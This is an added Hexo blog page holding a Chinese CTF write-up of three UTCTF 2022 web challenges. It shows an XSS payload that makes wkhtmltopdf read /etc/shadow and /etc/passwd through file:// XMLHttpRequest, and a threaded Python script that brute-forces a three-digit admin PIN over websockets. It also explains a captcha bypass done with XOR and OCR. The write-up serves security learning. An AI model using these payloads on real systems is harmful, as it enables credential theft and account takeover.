@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#6c599f">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/./images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/./images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/./images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/./images/safari-pinned-tab-next.svg" color="#6c599f">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=EB Garamond, Noto Serif SC:300,300italic,400,400italic,700,700italic|Long Cang:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"localhost","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="UTCTFUTCTF是由德克萨斯大学奥斯汀分校的信息与系统安全协会运营的，面向全世界所有人。此次正好是一个练手机会，最终排名第20，其中主要做了一些web和流量分析的题目，这里简单写下wp。 HTML2PDF解题思路题目是一个把html转为PDF的功能。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UTCTF-WEB-WP">
+<meta property="og:url" content="http://localhost:4000/posts/UTCTF-WEB-WP/">
+<meta property="og:site_name" content="匆匆那年">
+<meta property="og:description" content="UTCTFUTCTF是由德克萨斯大学奥斯汀分校的信息与系统安全协会运营的，面向全世界所有人。此次正好是一个练手机会，最终排名第20，其中主要做了一些web和流量分析的题目，这里简单写下wp。 HTML2PDF解题思路题目是一个把html转为PDF的功能。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220325172212225.png">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220325175606918.png">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220325175535786.png">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220327222214792.png">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220328212136142.png">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220328212202236.png">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220328213232959.png">
+<meta property="article:published_time" content="2022-03-25T09:18:09.000Z">
+<meta property="article:modified_time" content="2022-03-28T13:40:44.611Z">
+<meta property="article:author" content="Geez">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://localhost:4000/images/pages/image-20220325172212225.png">
+
+<link rel="canonical" href="http://localhost:4000/posts/UTCTF-WEB-WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>UTCTF-WEB-WP | 匆匆那年</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">匆匆那年</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">钟声敲在你我耳边</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-fas fa-home"></i>首页</a>
+
+  </li>
+        
+            
+  <li class="menu-item menu-item-overview">
+
+    <a href="/overview/" rel="section"><i class="fa fa-fw fa-fas fa-archive"></i>总览</a>
+
+  </li>
+
+
+      
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-fas fa-location-arrow"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-fas fa-heart"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/posts/UTCTF-WEB-WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Geez">
+      <meta itemprop="description" content="黑客,诗人,养龟仔">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="匆匆那年">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          UTCTF-WEB-WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发布：</span>
+
+              <time title="创建时间：2022-03-25 17:18:09" itemprop="dateCreated datePublished" datetime="2022-03-25T17:18:09+08:00">2022-03-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类：</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/overview/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="UTCTF"><a href="#UTCTF" class="headerlink" title="UTCTF"></a>UTCTF</h2><p>UTCTF是由德克萨斯大学奥斯汀分校的信息与系统安全协会运营的，面向全世界所有人。此次正好是一个练手机会，最终排名第20，其中主要做了一些web和流量分析的题目，这里简单写下wp。</p>
+<h2 id="HTML2PDF"><a href="#HTML2PDF" class="headerlink" title="HTML2PDF"></a>HTML2PDF</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目是一个把html转为PDF的功能。</p>
+<span id="more"></span>
+
+<p><img data-src="/images/pages/image-20220325172212225.png" alt="image-20220325172212225"></p>
+<p>这里由于题目关闭没有渲染后的PDF截图了，大致就是一个图片渲染进去了。我们通过下载这个PDF文件，并查看文件内容可以看到我们的图片确实是被解析了。说明我们的代码是被执行了的，所以此处存在xss，现在我们就是需要利用xss来读取文件。</p>
+<p>其实这里面还有一个细节就是大部分第三方组件生成的PDF都在头部信息有标明，这就涉及到信息搜集的敏感度了。一般在PDF文件头信息或者是burp的响应中能看到关键组件信息，有时候他也存在于响应的UA中,此题目通过下载的PDF头查看到用的是wkhtmltopdf组件，此组件网上也有现成的漏洞资料。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/">https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/</a></p>
+<p>常理说我们不应该可以直接iframe进行文件读取，比如下面这样通常会有问题</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;file:///xxxxx/xxxxx/*.py&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们先来看看常见情况下iframe标签读取会遇到什么问题？</p>
+<p><img data-src="/images/pages/image-20220325175606918.png" alt="image-20220325175606918"></p>
+<p><img data-src="/images/pages/image-20220325175535786.png" alt="image-20220325175535786"></p>
+<p>可以看到提示跨域http协议不能file协议读本地文件，因为file协议和http协议不同源，所以我们在一些xss中无法使用上面的代码进行文件获取。</p>
+<p>但是因为wkhtmltopdf在转换pdf的时候使用的是file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;xxxxx&#x2F;test.html 这种读取的本地html文件，所以我们此处用iframe的src file协议即可同源读取。</p>
+<p>但是如果我们直接读取 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 会发现读不到，这是因为从Gecko 1.9开始，file协议中的文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。所以我们仍需要想办法跨域。</p>
+<p>这里用的是XHR跨域读取本地文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/shadow&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到shadow,直接看密码，登录即可得flag</p>
+<p><img data-src="/images/pages/image-20220327222214792.png" alt="image-20220327222214792"></p>
+<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>那么如果遇到跨域问题我们如何进行跨域的读取呢？</p>
+<p>这里我们可以通过两种方式来实现</p>
+<h4 id="CORS跨域资源共享"><a href="#CORS跨域资源共享" class="headerlink" title="CORS跨域资源共享"></a>CORS跨域资源共享</h4><p>CORS跨域资源共享是目前的主流方案，基本所有浏览器都支持，当然IE需要版本新一点。CORS跨域资源共享本质是一种协约。</p>
+<p>原理就是浏览器通过XMLHttpRequest发送跨域请求，并自动添加一些附加header信息，同时服务端约定了Access-Control-Allow-Origin（允许的跨域请求域名）和Access-Control-Allow-Methods（允许的跨域请求方式）响应头，如果符合标准则返回资源内容，否则一般是403。</p>
+<p>当然一些复杂请求比如跨域的PUT和DELETE会稍微复杂一点，会先OPTION预请求下服务端同样验证通过后再进行下一步的跨域请求，此处的实现细节和简单的GET和POST请求可能略有不同，此处不在展开，以免占太大篇幅，以后有机会再详细讲讲。</p>
+<p>那么基于此我们就知道如何进行跨域请求了：XMLHttpRequest<br>payload1:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面可以跨域 但是真正能不能请求成功需要看服务端的Access-Control-Allow-Origin（允许的跨域请求域名）和Access-Control-Allow-Methods（允许的跨域请求方式）两个字段的规则<br>由于此题目的Origin是file:&#x2F;&#x2F; 所以此处符合同源策略可直接读取。</p>
+<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>jsonp跨域就是把想要跨域的内容直接当作js请求返回，众所周知</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxxx.com/dsadsa.js</span>&gt;</span>标签是可以跨域的</span><br></pre></td></tr></table></figure>
+
+<p>这个一般不好利用来读取本地文件，但是他也存在一些其他的安全问题，这个以后再说。</p>
+<h2 id="Websockets"><a href="#Websockets" class="headerlink" title="Websockets"></a>Websockets</h2><p>打开题目就是一个网站展示页</p>
+<p><img data-src="/images/pages/image-20220328212136142.png" alt="image-20220328212136142"></p>
+<p>其中login url有一个登录端口</p>
+<p><img data-src="/images/pages/image-20220328212202236.png" alt="image-20220328212202236"></p>
+<p>输入错误的用户名会提示用户名不存在，如果是正确的则是pin不正确，所以基于此可以确定用户名admin，然后F12查看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;topbox&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can&#x27;t remember jack --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;PIN&quot;</span> <span class="attr">required</span> <span class="attr">pattern</span>=<span class="string">&quot;(\d&#123;3&#125;|\d&#123;16&#125;)&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以知晓是三位数字爆破，但是这里考察的是websoket爆破，因为通信是websocket协议</p>
+<p>我们直接写一个python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;ws://web1.utctf.live:8651/internal/ws&#x27;</span></span><br><span class="line">PINLENGTH = <span class="number">3</span></span><br><span class="line">USERNAME = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">tryLoginWith</span>(<span class="params">pin</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(URL) <span class="keyword">as</span> websocket:</span><br><span class="line">        begin = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">if</span> begin == <span class="string">&#x27;begin&#x27;</span>:</span><br><span class="line">            <span class="keyword">await</span> websocket.send(<span class="string">f&#x27;begin&#x27;</span>)</span><br><span class="line">            <span class="keyword">await</span> websocket.send(<span class="string">f&#x27;user <span class="subst">&#123;USERNAME&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">await</span> websocket.send(<span class="string">f&#x27;pass <span class="subst">&#123;pin&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            data = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;session&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[&lt;&lt;&lt;] Data: <span class="subst">&#123;data&#125;</span> | Pincode: <span class="subst">&#123;pin&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[-] Wrong Pincode: <span class="subst">&#123;pin&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">args</span>):</span><br><span class="line">    asyncio.run(tryLoginWith(<span class="built_in">str</span>(args).zfill(PINLENGTH)))</span><br><span class="line"></span><br><span class="line">args = [ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>) ]</span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">100</span>) <span class="keyword">as</span> pool:</span><br><span class="line">    pool.<span class="built_in">map</span>(send,args)</span><br></pre></td></tr></table></figure>
+
+<p>登录即可获取flag</p>
+<h2 id="ReReCaptcha"><a href="#ReReCaptcha" class="headerlink" title="ReReCaptcha"></a>ReReCaptcha</h2><p>这道题目的考点其实很明确，就是要连续正确识别1000个验证码。</p>
+<p>首先测试可以得知每个cookie都对应了一个验证码，且记录了正确的次数，这可以保证我们即使识别错误依然可以回退到上一个验证码的cookie，不必从头开始。至于验证码识别我常用的是muggle模块，但是验证码过于复杂，无法识别，此处需要过滤噪音。我一个同事发现此验证码的背景图片几乎一致，如果我们把背景图片抠出来然后再xor就能拿到纯验证码的图片，然后再muggle识别就ok了。</p>
+<p>最后我们抠出如图</p>
+<p><img data-src="/images/pages/image-20220328213232959.png" alt="image-20220328213232959"></p>
+<p>尽管xor后的图片仍然可能比较模糊 但是正确率已经足够</p>
+<p>最终我们获得了flag</p>
+<p>网上别的wp用的python ocr是 pytesseract 这个大家可以合理参考。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6913541999735881741">https://juejin.cn/post/6913541999735881741</a></li>
+<li><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html">https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+
+<span style="margin-top:30px; color:var(--blockquote-color); font-size:0.85em">
+        <br>
+        <span class="post-end-item" title="copyright"">
+            <span class="post-end-item-icon" style="margin-right: 3px">
+                <i class="fab fa-fw fa-creative-commons"></i>
+            </span>
+            <span class="post-end-item-text">采用署名-非商业性使用-相同方式共享 4.0（CC BY-NC-SA 4.0）许可协议</span>
+        </span>
+</span>
+
+
+
+
+
+<div class="donations">
+    <div class="donation-label">「分享也是一种学习」</div>
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/overview/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip/" rel="prev" title="绕过CDN查找真实ip">
+      <i class="fa fa-chevron-left"></i> 绕过CDN查找真实ip
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#UTCTF"><span class="nav-text">UTCTF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTML2PDF"><span class="nav-text">HTML2PDF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E5%B1%95"><span class="nav-text">拓展</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CORS%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB"><span class="nav-text">CORS跨域资源共享</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JSONP"><span class="nav-text">JSONP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Websockets"><span class="nav-text">Websockets</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ReReCaptcha"><span class="nav-text">ReReCaptcha</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Geez"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Geez</p>
+  <div class="site-description" itemprop="description">黑客,诗人,养龟仔</div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/geeeez/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;geeeez&#x2F;" rel="noopener" target="_blank"><i class="fa fa-fw fa-fab fa-github"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-fas fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Geez</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">122k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:51</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
